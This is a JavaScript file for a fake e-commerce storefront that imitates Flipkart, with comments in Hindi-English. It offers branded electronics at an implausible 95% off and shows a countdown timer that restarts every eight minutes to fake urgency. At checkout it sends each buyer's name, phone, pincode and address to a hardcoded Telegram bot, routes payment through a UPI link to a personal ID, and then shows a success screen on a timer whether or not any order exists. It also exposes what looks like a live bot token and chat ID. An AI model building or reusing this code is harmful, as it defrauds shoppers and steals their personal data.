// --- CONFIGURATION (Yahan apni details dalein) ---
// WARNING: Putting bot tokens in frontend code is not secure for real websites.
// Anyone can see this token. Use only for testing/learning.
const TELEGRAM_BOT_TOKEN = "6305172063:AAFHumurpK6wMV7K-6FZBg-DSKxwMuD4Vw0"; 
const TELEGRAM_CHAT_ID = "1815847082"; // <--- Aapka Chat ID update ho gaya hai

const products = [
    // --- Earbuds (Keywords: wireless, earbuds, isolated) ---
    { 
        id: 1,
        category: "Earbuds",
        name: "Aroma NB121 Pods",
        fullName: "Aroma NB121 Pods Upto 40 Hours Playtime Type C Fast Charging",
        price: 2999, 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/d/u/0/nb121-pods-upto-40-hours-playtime-type-c-fast-charging-dual-original-imahh4a72k7jbk2h.jpeg?q=70&amp;crop=false"
    },
    { 
        id: 2, 
        category: "Earbuds", 
        name: "GOBOULT Z40", 
        fullName: "GOBOULT Z40 with ENC Mic, 60Hr Battery, Metal Finish", 
        price: 3499, 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/d/a/c/-original-imahebzzqs5fspcv.jpeg?q=70&crop=false" 
    },
    {
        id: 3,
        category: "Earbuds",
        name: "OnePlus Nord Buds 3r", 
        fullName: "OnePlus Nord Buds 3r TWS Earbuds, 3D Audio, 2-mic call (Blue)", 
        price: 2299, 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/p/t/b/-original-imahf9daxb97keh5.jpeg?q=70&crop=false" 
    },
    { 
        id: 4, 
        category: "Earbuds", 
        name: "Mivi Duopods B1", 
        fullName: "Mivi Duopods B1 (Just Launched) 45 Hours Playtime", 
        price: 1999, 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/k/k/r/-original-imaha9pgxwpfewtb.jpeg?q=70&crop=false" 
    },
    { 
        id: 5, 
        category: "Earbuds", 
        name: "truke Buds Lite", 
        fullName: "truke Buds Lite with 60 Hours Playtime, Deep Bass", 
        price: 1599, 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/o/f/d/-original-imahgbn7hzywq3gm.jpeg?q=70&crop=false" 
    },
    { 
        id: 6, 
        category: "Earbuds", 
        name: "OnePlus Nord Buds 3r", 
        fullName: "OnePlus Nord Buds 3r TWS Earbuds, Ash Black", 
        price: 2299, 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/7/n/o/-original-imahfsg7chmgrugu.jpeg?q=70&crop=false" 
    },
    
    // --- Sunglasses ---
    { 
        id: 7, 
        category: "Sunglasses", 
        name: "UV Wayfarer", 
        fullName: "UV Protection Wayfarer Sunglasses (Free Size) (Black)", 
        price: 999, 
        image: "https://rukminim2.flixcart.com/image/832/832/xif0q/sunglass/v/9/p/free-size-com179-13-dervin-original-imahya4ekrznrmfb.jpeg?q=70&crop=false" 
    },
    { 
        id: 8, 
        category: "Sunglasses", 
        name: "Retro Square", 
        fullName: "UV Protection Retro Square Round Sunglasses (Black)", 
        price: 1299, 
        image: "https://rukminim2.flixcart.com/image/832/832/xif0q/sunglass/h/l/p/free-dd-29a-bollywood-stylish-dkeraod-original-imahgq34aswzc2mq.jpeg?q=70&crop=false" 
    },
    { 
        id: 9, 
        category: "Sunglasses", 
        name: "Riding Glasses", 
        fullName: "UV Protection Riding Glasses, Rectangle Sunglasses", 
        price: 799, 
        image: "https://rukminim2.flixcart.com/image/832/832/xif0q/sunglass/t/n/c/medium-goldrimless-spectaswag-original-imahfvfmmbjpfzkz.jpeg?q=70&crop=false" 
    },
    { 
        id: 10, 
        category: "Sunglasses", 
        name: "Sport Wrap", 
        fullName: "UV Protection Wrap-Around Sports Sunglasses (Multicolor)", 
        price: 1499, 
        image: "https://rukminim2.flixcart.com/image/832/832/xif0q/sunglass/2/p/o/medium-polarized-uv-protection-cycling-running-sports-unisex-original-imah9uezabpvc8gx.jpeg?q=70&crop=false" 
    },
    { 
        id: 11, 
        category: "Sunglasses", 
        name: "Polarized Round", 
        fullName: "UV Protection Gradient Polarized Round Sunglasses (Black)", 
        price: 1999, 
        image: "https://rukminim2.flixcart.com/image/832/832/xif0q/sunglass/r/y/r/medium-pathan-sunglass-19r-rozti-original-imah2zgqxdgycugw.jpeg?q=70&crop=false" 
    },

    // --- Smartwatches ---
    { 
        id: 12, 
        category: "Smartwatch", 
        name: "Bolt Drift+", 
        fullName: "Bolt Drift+ 1.85, Bluetooth Calling, 500nits, 150+ Faces (White)", 
        price: 3999, 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/smartwatch/j/h/o/-original-imahejynzkuaaaty.jpeg?q=70&crop=false" 
    },
    { 
        id: 13, 
        category: "Smartwatch", 
        name: "Samsung Galaxy 7", 
        fullName: "Samsung Galaxy Watch7 44mm LTE Smartwatch (Green Strap)", 
        price: 29999, 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/smartwatch/e/o/m/-original-imahghmjmftemu54.jpeg?q=70&crop=false" 
    },
    { 
        id: 14, 
        category: "Smartwatch", 
        name: "Teton 1.85", 
        fullName: "Teton 1.85 | Premium Design | Functional Crown | AI Coach (Black)", 
        price: 4500, 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/smartwatch/t/g/s/-original-imagwezgyvbke6up.jpeg?q=70&crop=false" 
    },
    { 
        id: 15, 
        category: "Smartwatch", 
        name: "Fastrack Revoltt", 
        fullName: "Fastrack Revoltt FS2Pro - 1.96 Super AMOLED Curved (Black)", 
        price: 5999, 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/smartwatch/t/a/e/-original-imah4nbwu6xapqdx.jpeg?q=70&crop=false" 
    },
    { 
        id: 16, 
        category: "Smartwatch", 
        name: "Fastrack Radiant", 
        fullName: "Fastrack Radiant FX4 - 1.51 AMOLED | AOD | SS Strap (Gold)", 
        price: 6499, 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/smartwatch/6/x/i/38-354-38158wm01-android-ios-fastrack-yes-original-imah6wqm5ywzhtbv.jpeg?q=70&crop=false" 
    },

    // --- Headphones/Audio ---
    { 
        id: 17, 
        category: "Headset", 
        name: "Bolt Z40 Pro", 
        fullName: "Bolt Z40 Pro with 100H Battery, Quad Mic ENC, Rubber Grip (Midnight)", 
        price: 2499, 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/u/6/u/-original-imahd2rhkgzwyuun.jpeg?q=70&crop=false" 
    },
    { 
        id: 18, 
        category: "Headset", 
        name: "Realme Buds T200", 
        fullName: "Realme Buds T200 Lite 12.4mm Driver, 48hrs Playback (Black)", 
        price: 1899, 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/d/b/h/-original-imaha6btcgqdqy5e.jpeg?q=70&crop=false" 
    },
    { 
        id: 19, 
        category: "Headset", 
        name: "Patron Bassbuds", 
        fullName: "Patron Bassbuds Vibe 34 Hrs Playback, 13mm Drivers (Lilac)", 
        price: 1299, 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/f/u/m/-original-imah9f97v86bkauj.jpeg?q=70&crop=false" 
    },
    { 
        id: 20, 
        category: "Headset", 
        name: "GoBolt Fluid X Pro", 
        fullName: "GoBolt Fluid X Pro ANC, 70H Battery, Foldable, Gaming Mode (Beige)", 
        price: 3499, 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/m/t/5/-original-imahf77sttdscszt.jpeg?q=70&crop=false" 
    },
    { 
        id: 21, 
        category: "Headset", 
        name: "GoBolt Fluid X", 
        fullName: "GoBolt Fluid X with 60H Battery, Foldable, ENC Mic (White)", 
        price: 2999, 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/o/o/s/-original-imahf77syamgxzfy.jpeg?q=70&crop=false" 
    },
    { 
        id: 22, 
        category: "Headset", 
        name: "Zeb-Thunder Pro", 
        fullName: "Zebronics Zeb-Thunder Pro 60H Backup, BT v5.3, Gaming Mode (Olive)", 
        price: 1599, 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/wireless-headset/z/s/z/zeb-thunder-pro-zebronics-original-imahb2er7evh5fcg.jpeg?q=70&crop=false" 
    },
    { 
        id: 23, 
        category: "Headset", 
        name: "Boat Rockerz 480", 
        fullName: "Boat Rockerz 480 Beast Mode, RGB LEDs, 60 Hrs Playback (Black Sabre)", 
        price: 2299, 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/t/k/l/-original-imah5h428mq9v8bb.jpeg?q=70&crop=false" 
    },
    { 
        id: 24, 
        category: "Headset", 
        name: "bAot B5 Neckband", 
        fullName: "bAot Wireless Earbuds B5 Neckband 48 Hrs Playback (Black)", 
        price: 999, 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/x/q/g/wireless-5-bluetooth-neckband-hd-sound-enc-mic-lightweight-original-imahefhdhhuezm6t.jpeg?q=70&crop=false" 
    },
    { 
        id: 25, 
        category: "Headset", 
        name: "Boat Rockerz 202", 
        fullName: "Boat Rockerz 202, 20H Battery, ENx, ASAP Charge (Active Black)", 
        price: 1499, 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/o/n/x/-original-imahgxngysekkxv9.jpeg?q=70&crop=false" 
    },
    { 
        id: 26, 
        category: "Wired", 
        name: "Trigger Blaze", 
        fullName: "Trigger Blaze 3.5mm Wired Earphones 13mm Driver, Rich Bass (Orange)", 
        price: 499, 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/k/x/u/-original-imahfvt66acj8r7y.jpeg?q=70&crop=false" 
    },
    { 
        id: 27, 
        category: "Wired", 
        name: "JBL C150SI", 
        fullName: "JBL C150SI with One-Button Universal Remote (Black)", 
        price: 899, 
        image: "https://rukminim2.flixcart.com/image/416/416/kokdci80/headphone/dynamic/h/b/h/c150siublk-jbl-original-imag2zyvwwujwa7t.jpeg?q=70&crop=false" 
    },
    { 
        id: 28, 
        category: "Wired", 
        name: "Spinbot BattleBudz", 
        fullName: "Spinbot BattleBudz C30 Type-C Gaming Earphones (Black, Red)", 
        price: 699, 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/l/k/h/battlebudz-c30-type-c-gaming-earphones-with-boom-mic-12mm-gaming-original-imahftzfhafyhyky.jpeg?q=70&crop=false" 
    },
    { 
        id: 29, 
        category: "Wired", 
        name: "Portronics Conch", 
        fullName: "Portronics Conch Gama Earphones 1.2m Cable, Aux Port (Black)", 
        price: 399, 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/o/v/u/por-1025-gama-portronics-original-imahbnhya6fkhrsy.jpeg?q=70&crop=false" 
    },
    
    // --- Trimmers ---
    { 
        id: 30, 
        category: "Trimmer", 
        name: "Zapkart Trimmer", 
        fullName: "Zapkart Trimmer pack of 1, 45 min Runtime (Black, Silver)", 
        price: 899, 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/trimmer/e/0/2/0-5-8-mm-trimmer-packof-1-asfa-87-stainless-steel-corded-original-imahgz3azgshzyec.jpeg?q=70&crop=false" 
    },
    { 
        id: 31, 
        category: "Trimmer", 
        name: "Smartbuy FKSB 10", 
        fullName: "Flipkart Smartbuy FKSB 10, Runtime: 120 min for Men", 
        price: 1199, 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/trimmer/k/x/9/0-25-4-mm-fksb-10-titanium-coated-cordless-flipkart-smartbuy-original-imahdzppszx6tx2d.jpeg?q=70&crop=false" 
    },
    { 
        id: 32, 
        category: "Trimmer", 
        name: "Nova NHT 1132", 
        fullName: "Nova NHT 1132, Runtime: 150 min for Men (Black, Red)", 
        price: 1099, 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/trimmer/0/6/v/0-5-20-mm-nht-1132-stainless-steel-cordless-nova-original-imahd2hskhxz9uut.jpeg?q=70&crop=false" 
    },
    { 
        id: 33, 
        category: "Trimmer", 
        name: "Smartbuy FKSB 20", 
        fullName: "Flipkart Smartbuy FKSB 20, IPX4, Digital Display, 150 min", 
        price: 1499, 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/trimmer/m/f/k/0-25-4-mm-fksb-20-ipx4-digital-display-2-speed-setting-original-imah5dtgkm3bwgyx.jpeg?q=70&crop=false" 
    },
    { 
        id: 34, 
        category: "Trimmer", 
        name: "Bombay Shaving", 
        fullName: "Bombay Shaving Company POWER PLAY NXT BEARD TRIMMER (Green)", 
        price: 1699, 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/shopsy-trimmer/a/2/k/trimmer-1-20-mm-stainless-steel-power-play-nxt-beard-trimmer-i-original-imahazyzffanxhrw.jpeg?q=70&crop=false" 
    }
];


// --- CORE FUNCTIONS ---

function getDiscountedPrice(price) {
    return Math.floor(price * 0.05); // 95% Off logic
}

let currentProduct = null;
let currentPrice = 0;

// 1. Render Grid
function renderProducts() {
    const container = document.getElementById('product-container');
    if (!container) return; // Safety check
    
    container.innerHTML = '';
    products.forEach(product => {
        const discPrice = getDiscountedPrice(product.price);
        
        const card = document.createElement('div');
        card.className = 'product-card';
        card.innerHTML = `
            <div class="discount-badge">95% OFF</div>
            <img src="${product.image}" class="product-img" loading="lazy">
            <div class="product-title">${product.name}</div>
            <div class="price-box">
                <span class="new-price">₹${discPrice}</span>
                <span class="old-price">₹${product.price}</span>
                <span class="off-percent">95% off</span>
            </div>
        `;
        // Direct click handler
        card.onclick = function() { showProductDetail(product); };
        container.appendChild(card);
    });
}

// 2. Show Detail Page (THE FIX: Force switch & Scroll Top)
function showProductDetail(product) {
    currentProduct = product;
    currentPrice = getDiscountedPrice(product.price);

    // Get Elements freshly to avoid null errors
    const homeView = document.getElementById('home-view');
    const detailView = document.getElementById('product-detail-view');
    const timerSection = document.getElementById('timer-section');

    // Update Content
    document.getElementById('detail-img').src = product.image;
    document.getElementById('detail-title').innerText = product.fullName;
    document.getElementById('detail-price').innerText = `₹${currentPrice}`;
    document.getElementById('detail-old-price').innerText = `₹${product.price}`;

    // SWITCH LOGIC: Explicitly hide home, show detail
    if(homeView) homeView.style.display = 'none';      // Force Hide
    if(timerSection) timerSection.style.display = 'none'; // Force Hide
    
    if(detailView) {
        detailView.classList.remove('hidden'); // Remove class
        detailView.style.display = 'block';    // Force Show
    }

    // SCROLL TO TOP (Crucial for "New Page" feel)
    window.scrollTo({ top: 0, behavior: 'auto' });
}

// 3. Go Home (Reset)
function goHome() {
    const homeView = document.getElementById('home-view');
    const detailView = document.getElementById('product-detail-view');
    const timerSection = document.getElementById('timer-section');

    if(detailView) {
        detailView.classList.add('hidden');
        detailView.style.display = 'none';
    }
    
    if(homeView) homeView.style.display = 'block';
    if(timerSection) timerSection.style.display = 'block';

    window.scrollTo({ top: 0, behavior: 'auto' });
}

// 4. Checkout Logic
function startCheckout() {
    const modal = document.getElementById('checkoutModal');
    const stepAddr = document.getElementById('step-address');
    const stepPay = document.getElementById('step-payment');

    // Reset steps
    stepAddr.classList.remove('hidden');
    stepPay.classList.add('hidden');
    
    // Clear inputs
    document.getElementById('input-name').value = '';
    document.getElementById('input-phone').value = '';
    
    modal.style.display = "flex";
}

function closeModal() {
    document.getElementById('checkoutModal').style.display = "none";
}

// --- NEW FUNCTION: Send Data to Telegram ---
function sendToTelegram(message) {
    if(!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
        console.error("Telegram Bot Token is missing or invalid.");
        return;
    }
    
    if(!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID_HERE") {
        console.error("Telegram Chat ID is missing. Please set your Chat ID.");
        return;
    }

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const data = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
    };

    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    })
    .then(response => {
        if(response.ok) {
            console.log("Sent to Telegram");
        } else {
            console.error("Telegram API Error:", response.statusText);
        }
    })
    .catch(error => console.error("Telegram Fetch Error:", error));
}

function goToPayment() {
    const name = document.getElementById('input-name').value;
    const phone = document.getElementById('input-phone').value;
    const pincode = document.getElementById('input-pincode').value;
    const addr = document.getElementById('input-addr').value;

    if(!name || !phone || !pincode || !addr) {
        alert("Please fill all required details");
        return;
    }

    // --- CAPTURE DATA & SEND TO TELEGRAM ---
    const orderDetails = `
📦 *NEW ORDER ALERT* 📦
-------------------------
👤 *Name:* ${name}
📱 *Phone:* ${phone}
📮 *Pin:* ${pincode}
🏠 *Address:* ${addr}
-------------------------
🛒 *Product:* ${currentProduct.name}
💰 *Price:* ₹${currentPrice}
    `;
    
    sendToTelegram(orderDetails);
    // ---------------------------------------

    document.getElementById('step-address').classList.add('hidden');
    document.getElementById('step-payment').classList.remove('hidden');
    document.getElementById('payment-total').innerText = `₹${currentPrice}`;
}

function backToAddress() {
    document.getElementById('step-payment').classList.add('hidden');
    document.getElementById('step-address').classList.remove('hidden');
}

const UPI_ID = "simplejat01@ybl"; 

function processPayment() {
    const upiLink = `upi://pay?pa=${UPI_ID}&pn=FlipStore&am=${currentPrice}&cu=INR`;
    window.location.href = upiLink;

    // 20 Seconds Delay as requested
    setTimeout(() => {
        closeModal();
        document.getElementById('successModal').style.display = 'flex';
    }, 20000);
}

function closeSuccessAndHome() {
    document.getElementById('successModal').style.display = 'none';
    goHome();
}

// 5. Timer (8 Min Global Sync)
function startTimer() {
    const timerElem = document.getElementById('timer');
    if (!timerElem) return;

    setInterval(() => {
        const cycleDuration = 8 * 60; 
        const now = Math.floor(Date.now() / 1000); 
        const timeLeft = cycleDuration - (now % cycleDuration);
        
        const m = Math.floor(timeLeft / 60);
        const s = timeLeft % 60;
        
        timerElem.innerText = `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
    }, 1000);
}

// INITIALIZE
document.addEventListener('DOMContentLoaded', () => {
    renderProducts();
    startTimer();
});
